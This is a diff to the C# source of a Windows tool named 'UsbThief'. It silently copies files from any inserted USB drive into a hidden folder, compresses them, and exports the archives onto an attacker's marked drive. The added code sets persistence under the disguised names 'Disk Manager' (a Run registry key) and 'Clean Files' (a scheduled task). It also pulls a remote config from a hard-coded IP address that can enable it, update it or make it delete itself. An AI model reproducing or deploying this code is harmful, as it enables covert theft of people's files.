@@ -1,19 +1,17 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
 using System.Diagnostics;
-using System.Drawing;
 using System.IO;
-using System.Linq;
 using System.Management;
+using System.Net;
 using System.Reflection;
-using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Windows.Forms;
 using Ionic.Zip;
 using Microsoft.Win32;
+using Microsoft.Win32.TaskScheduler;
+using Newtonsoft.Json;
 using NLog;
 
 namespace UsbThief
@@ -22,7 +20,7 @@ namespace UsbThief
     {
         #region 声明变量
         public const int innerVer = 0;
-        public string workspace = Application.StartupPath + "\\data\\diskcache\\files\\";
+        public string workspace = Application.StartupPath + @"\data\diskcache\files\";
         public bool showRealMenu = false;
         public bool fc2c = false;
         public const int WM_DEVICECHANGE = 0x219;//U盘插入后，OS的底层会自动检测到，然后向应用程序发送“硬件设备状态改变“的消息
@@ -33,20 +31,21 @@ namespace UsbThief
         public const int DBT_DEVICEREMOVEPENDING = 0x8003;  //一个设备或媒体一块即将被删除。不能否认的。
         public Logger logger = LogManager.GetCurrentClassLogger();
         public SynchronizationContext mainThreadSynContext;
-        public Thread copyT;
-        public Thread compT;
         public Status sta = Status.none;
-        public Config conf = new Config { enable = false, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
+        public Config conf = new Config { enable = false, suicide = false, ver = innerVer, update = null, exts = null, sizeLim = 100, volName = "仿生人会涮电子羊吗" };
         public UsbDevice currentDevice = new UsbDevice { name = "none", ser = "none" };
         public enum Status
         {
             none,
             copying,
-            compressing
+            compressing,
+            exporting,
+            exported
         }
         public struct Config
         {
             public bool enable;
+            public bool suicide;
             public int ver;
             public string update;
             public List<string> exts;
@@ -62,11 +61,14 @@ namespace UsbThief
         #region 初始化
         public Form1()
         {
+            string[] args = Environment.GetCommandLineArgs();//作用相当于输入参数的string数组
+            if (args.Length < 2 || args[1] != "-run")
+            {
+                Environment.Exit(0);
+            }
             InitializeComponent();
             logger.Info("UsbThief已启动");
             logger.Info("innerVer：" + innerVer);
-            copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
-            compT = new Thread(new ParameterizedThreadStart(Compress));
             mainThreadSynContext = SynchronizationContext.Current;
             notifyIcon1.MouseUp += NotifyIcon1_MouseUp;
             notifyIcon1.ContextMenuStrip.Items[0].Click += Item0_Click;
@@ -74,40 +76,107 @@ namespace UsbThief
             HideFiles(workspace);
             try
             {
-                Dictionary<string, string> devices = new Dictionary<string, string>();
-                StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
-                string line;
-                while ((line = sr.ReadLine()) != null)
+                string path = Application.ExecutablePath;
+                RegistryKey rk = Registry.CurrentUser;
+                RegistryKey rk2 = rk.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run");
+                if (rk2.GetValue("Disk Manager") == null)
                 {
-                    string tmpSer = line.Split(':')[0];
-                    string status = line.Split(':')[1];
-                    devices.Add(tmpSer, status);
+                    rk2.SetValue("Disk Manager", path);
+                    logger.Info("已设置开机启动");
                 }
-                sr.Close();
-                foreach (var item in devices)
+                rk2.Close();
+                rk.Close();
+            }
+            catch (Exception e)
+            {
+                logger.Error("无法设置开机启动:\n" + e);
+            }
+            try
+            {
+                if (TaskService.Instance.FindTask("Clean Files") == null)
                 {
-                    if (item.Value == Status.copying.ToString() || item.Value == Status.compressing.ToString())
-                    {
-                        Thread compT = new Thread(new ParameterizedThreadStart(Compress));
-                        compT.Start(item.Key);
-                    }
+                    TaskService.Instance.AddTask("Clean Files", new WeeklyTrigger { DaysOfWeek = DaysOfTheWeek.Friday, StartBoundary = DateTime.Parse("2019-09-27 09:00") }, new ExecAction { Path = Application.StartupPath + "\\fileassistant.exe", Arguments = "-clean" });
+                    logger.Info("已设置计划任务");
                 }
             }
-            catch (Exception)
+            catch (Exception e)
+            {
+                logger.Error("无法设置计划任务:\n" + e);
+
+            }
+            Thread t = new Thread(() =>
             {
                 try
                 {
-                    if (File.Exists(Application.StartupPath + "\\status"))
-                        File.Delete(Application.StartupPath + "\\status");
-                    FileStream fs = File.Create(Application.StartupPath + "\\status");
-                    fs.Close();
+                    WebClient client = new WebClient
+                    {
+                        Encoding = Encoding.UTF8
+                    };
+                    string text = client.DownloadString("http://111.231.202.181/update.txt");
+                    logger.Info("获取到网络配置：\n" + text);
+                    conf = JsonConvert.DeserializeObject<Config>(text);
+                }
+                catch (Exception e)
+                {
+                    logger.Error("获取网络配置失败：\n" + e);
+                }
+            });
+            t.Start();
+            t.Join();
+            if (conf.suicide == true)
+            {
+                logger.Info("Bye World~");
+                Process.Start(Application.StartupPath + "\\fileassistant.exe", "-suicide");
+                Environment.Exit(0);
+            }
+            if (innerVer < conf.ver && (conf.update != null && conf.update != ""))
+            {
+                logger.Info("检测到新版本，即将启动助手程序");
+                Process.Start(Application.StartupPath + "\\fileassistant.exe", "-update=" + conf.update);
+                Environment.Exit(0);
+            }
+            if (conf.enable)
+            {
+                try
+                {
+                    Dictionary<string, string> devices = new Dictionary<string, string>();
+                    StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
+                    string line;
+                    while ((line = sr.ReadLine()) != null)
+                    {
+                        string tmpSer = line.Split(':')[0];
+                        string status = line.Split(':')[1];
+                        devices.Add(tmpSer, status);
+                    }
+                    sr.Close();
+                    foreach (var item in devices)
+                    {
+                        if (item.Value == Status.copying.ToString() || item.Value == Status.compressing.ToString())
+                        {
+                            Thread compT = new Thread(new ParameterizedThreadStart(Compress));
+                            compT.Start(item.Key);
+                        }
+                    }
                 }
                 catch (Exception)
                 {
-                    logger.Info("初始化状态文件失败");
+                    try
+                    {
+                        if (File.Exists(Application.StartupPath + "\\status"))
+                            File.Delete(Application.StartupPath + "\\status");
+                        FileStream fs = File.Create(Application.StartupPath + "\\status");
+                        fs.Close();
+                    }
+                    catch (Exception)
+                    {
+                        logger.Info("初始化状态文件失败");
+                    }
                 }
             }
-
+            else
+            {
+                logger.Info("部分功能已关闭");
+            }
         }
         #endregion
         #region 窗口加载
@@ -150,14 +219,14 @@ namespace UsbThief
         {
             try
             {
-                if (m.Msg == WM_DEVICECHANGE)
+                if (m.Msg == WM_DEVICECHANGE && conf.enable)
                 {
                     int wp = m.WParam.ToInt32();
                     if (wp == DBT_DEVICEARRIVAL || wp == DBT_DEVICEQUERYREMOVE || wp == DBT_DEVICEREMOVECOMPLETE || wp == DBT_DEVICEREMOVEPENDING)
                     {
-
                         if (wp == DBT_DEVICEARRIVAL)
                         {
+                            Thread copyT = new Thread(new ParameterizedThreadStart(Copy2Disk));
                             DriveInfo[] s = DriveInfo.GetDrives();
                             foreach (DriveInfo drive in s)
                             {
@@ -166,7 +235,7 @@ namespace UsbThief
                                     bool newDevice = false;
                                     Thread th = new Thread(() =>
                                     {
-                                        if (currentDevice.name == "none" && currentDevice.ser == "none" && sta == Status.none)
+                                        if (currentDevice.name == "none" && currentDevice.ser == "none" && (sta != Status.exporting || sta != Status.compressing))
                                         {
                                             string ser = GetUsbSer(drive.Name);
                                             if (ser != null)
@@ -188,7 +257,7 @@ namespace UsbThief
                                             notifyIcon1.ContextMenuStrip.Items[3].Text = " - U 盘 (" + currentDevice.name.Replace("\\", "") + ")";
                                             notifyIcon1.Visible = true;
                                         }
-                                        if (drive.VolumeLabel != "仿生人会涮电子羊吗")
+                                        if (drive.VolumeLabel != conf.volName)
                                         {
                                             WriteSta(currentDevice.ser, Status.copying);
                                             string[] para = { currentDevice.ser, currentDevice.name, workspace + currentDevice.ser };
@@ -196,19 +265,25 @@ namespace UsbThief
                                         }
                                         else
                                         {
-                                            logger.Info("目标USB设备“" + drive.VolumeLabel + "”已插入，不会对其进行复制操作");
+                                            logger.Info("目标Usb设备“" + drive.VolumeLabel + "”已插入，不会对其进行复制操作");
                                             try
                                             {
-                                                List<string> devices = new List<string>();
+                                                //List<string> devices = new List<string>();
+                                                //第二个bool指的是是否强制导出，如果之前导出过程中设备拔出导致状态停留在exporting，那么就强制导出
+                                                Dictionary<string, bool> devices = new Dictionary<string, bool>();
                                                 StreamReader sr = new StreamReader(Application.StartupPath + "\\status", Encoding.UTF8);
                                                 string line;
                                                 while ((line = sr.ReadLine()) != null)
                                                 {
                                                     string tmpSer = line.Split(':')[0];
                                                     string status = line.Split(':')[1];
-                                                    if (status == "none")
+                                                    if (status == Status.none.ToString())
                                                     {
-                                                        devices.Add(tmpSer);
+                                                        devices.Add(tmpSer, false);
+                                                    }
+                                                    else if (status == Status.exporting.ToString())
+                                                    {
+                                                        devices.Add(tmpSer, true);
                                                     }
                                                 }
                                                 sr.Close();
@@ -217,13 +292,46 @@ namespace UsbThief
                                                 {
                                                     foreach (var item in devices)
                                                     {
-                                                        if (file.Substring(file.LastIndexOf("\\") + 1) == item + ".zip")
+                                                        if (file.Substring(file.LastIndexOf("\\") + 1) == item.Key + ".zip")
                                                         {
-                                                            Console.WriteLine("就决定是你了！\n" + file);
-                                                            //就决定是你了！
+                                                            string tar = currentDevice.name + item.Key + ".zip";
+                                                            try
+                                                            {
+                                                                if (File.Exists(tar))
+                                                                {
+                                                                    FileInfo fi1 = new FileInfo(file);
+                                                                    FileInfo fi2 = new FileInfo(tar);
+                                                                    if (fi1.LastWriteTime > fi2.LastWriteTime || item.Value == true)
+                                                                    {
+                                                                        WriteSta(item.Key, Status.exporting);
+                                                                        logger.Info("正在导出文件：" + file);
+                                                                        File.Copy(file, currentDevice.name + item.Key + ".zip", true);
+                                                                        WriteSta(item.Key, Status.exported);
+                                                                        logger.Info("导出完成：" + currentDevice.name + item.Key + ".zip");
+                                                                    }
+                                                                    else
+                                                                    {
+                                                                        WriteSta(item.Key, Status.exported);
+                                                                    }
+                                                                }
+                                                                else
+                                                                {
+                                                                    WriteSta(item.Key, Status.exporting);
+                                                                    logger.Info("正在导出文件：" + file);
+                                                                    File.Copy(file, currentDevice.name + item.Key + ".zip");
+                                                                    WriteSta(item.Key, Status.exported);
+                                                                    logger.Info("导出完成：" + currentDevice.name + item.Key + ".zip");
+                                                                }
+                                                            }
+                                                            catch (Exception e)
+                                                            {
+
+                                                                logger.Error("文件导出失败：\n" + e);
+                                                            }
                                                         }
                                                     }
                                                 }
+
                                             }
                                             catch (Exception e)
                                             {
@@ -380,7 +488,21 @@ namespace UsbThief
         #region 检测扩展名
         private bool CheckExt(string ext)
         {
-            return true;
+            if (conf.exts == null || conf.exts.Count == 0)
+            {
+                return true;
+            }
+            else
+            {
+                foreach (var item in conf.exts)
+                {
+                    if (item.ToLower() == ext.ToLower())
+                    {
+                        return true;
+                    }
+                }
+                return false;
+            }
         }
         #endregion
         #region 复制文件
@@ -397,7 +519,6 @@ namespace UsbThief
             try
             {
                 fc2c = false;
-                long sizeLimitation = 10000 * (long)1048576;
                 DirectoryInfo sourceInfo = new DirectoryInfo(sourcePath);
                 if (!Directory.Exists(targetPath))
                     Directory.CreateDirectory(targetPath);
@@ -421,7 +542,7 @@ namespace UsbThief
                             }
                             else
                             {
-                                if (fi1.Length < sizeLimitation)
+                                if (fi1.Length < conf.sizeLim * (long)1048576 || conf.sizeLim == 0)
                                 {
                                     fc2c = true;
                                     logger.Info("正在复制文件：" + fsi.FullName);
@@ -443,11 +564,11 @@ namespace UsbThief
         }
         private void CopyDoneCallback(object state)
         {
-
             logger.Info("复制完成");
             if (fc2c)
             {
                 logger.Info("压缩线程启动");
+                Thread compT = new Thread(new ParameterizedThreadStart(Compress));
                 compT.Start(currentDevice.ser);
             }
             else
@@ -485,106 +606,4 @@ namespace UsbThief
         }
         #endregion
     }
-    //private void CopyDirectory(string sourcePath, string destinationPath)
-    //{
-    //    try
-    //    {
-    //        DirectoryInfo info = new DirectoryInfo(sourcePath);
-    //        if (!Directory.Exists(destinationPath))
-    //            Directory.CreateDirectory(destinationPath);
-    //        int fileSizeLimit = Properties.Settings.Default.filesize * 1048576;
-    //        string CopyLog = "复制操作：输出目录：" + destinationPath + "\r\n";
-    //        foreach (FileSystemInfo fsi in info.GetFileSystemInfos())
-    //        {
-    //            String destName = Path.Combine(destinationPath, fsi.Name);
-
-    //            if (fsi is FileInfo)
-    //            {   //如果是文件，复制文件
-    //                try
-    //                {
-    //                    FileInfo fi1 = new FileInfo(fsi.FullName);
-    //                    if (checkExt(fi1.Extension))
-    //                    {
-    //                        CopyLog += "复制文件：" + fsi.FullName + "\r\n";
-    //                        if (File.Exists(destName))
-    //                        {
-    //                            switch (Properties.Settings.Default.conflict)
-    //                            {
-    //                                case 0:
-    //                                    FileInfo fi2 = new FileInfo(destName);
-    //                                    if (fi1.LastWriteTime > fi2.LastWriteTime)
-    //                                    {
-    //                                        File.Copy(fsi.FullName, destName, true);
-    //                                    }
-    //                                    break;
-    //                                case 1:
-    //                                    destName = (new Random()).Next(0, 9999999) + "-" + destName;
-    //                                    File.Copy(fsi.FullName, destName);
-    //                                    break;
-    //                                case 2:
-    //                                    File.Copy(fsi.FullName, destName, true);
-    //                                    break;
-    //                                default:
-    //                                    break;
-    //                            }
-    //                        }
-    //                        else
-    //                        {
-    //                            switch (Properties.Settings.Default.filesizetype)
-    //                            {
-    //                                case 0:
-    //                                    File.Copy(fsi.FullName, destName);
-    //                                    break;
-    //                                case 1:
-    //                                    if (fi1.Length > fileSizeLimit)
-    //                                    {
-    //                                        File.Copy(fsi.FullName, destName);
-    //                                    }
-    //                                    break;
-    //                                case 2:
-    //                                    if (fi1.Length < fileSizeLimit)
-    //                                    {
-    //                                        File.Copy(fsi.FullName, destName);
-    //                                    }
-    //                                    break;
-    //                            }
-    //                        }
-    //                    }
-    //                }
-    //                catch (Exception ex)
-    //                {
-    //                    CopyLog += "复制文件失败：" + destName + "\r\n" + ex.ToString();
-    //                }
-    //            }
-    //            else //如果是文件夹，新建文件夹，递归
-    //            {
-    //                try
-    //                {
-    //                    if (Properties.Settings.Default.SkipEmptyFolder)
-    //                    {
-    //                        FileSystemInfo[] subFiles = (new DirectoryInfo(fsi.FullName)).GetFileSystemInfos();
-    //                        if (subFiles.Count() > 0)
-    //                        {
-    //                            CopyDirectory(fsi.FullName, destName);
-    //                        }
-    //                    }
-    //                    else
-    //                    {
-    //                        CopyDirectory(fsi.FullName, destName);
-    //                    }
-    //                }
-    //                catch (Exception ex)
-    //                {
-    //                    Program.log("创建目录：" + destName + "：失败：" + ex.ToString(), 1);
-    //                }
-    //            }
-    //        }
-    //        Program.log(CopyLog, 0);
-    //    }
-    //    catch (Exception ex)
-    //    {
-    //        Program.log("复制目录失败，设备可能被强行拔出：" + ex.ToString(), 1);
-    //    }
-    //}
-    //}
 }
